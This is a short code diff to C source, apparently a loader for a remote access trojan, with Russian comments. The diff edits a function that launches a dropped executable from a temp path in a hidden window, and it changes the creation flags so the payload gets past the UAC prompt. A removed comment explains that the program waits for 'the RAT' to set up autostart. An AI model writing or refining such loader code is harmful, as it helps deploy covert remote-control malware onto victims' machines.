@@ -125,8 +125,9 @@ void proc2() {{
         si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_HIDE;
         
+        // УБИРАЕМ CREATE_NO_WINDOW - это блокирует UAC!
         CreateProcessA(tmp, NULL, NULL, NULL, FALSE,
-                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+                       NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
         
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
@@ -137,10 +138,7 @@ void proc2() {{
 }}
 
 int main() {{
-    // Запускаем proc2 напрямую, без DLL entry point
     proc2();
-    
-    // Ждем пока RAT сделает автозагрузку
     Sleep(15000);
     return 0;
 }}
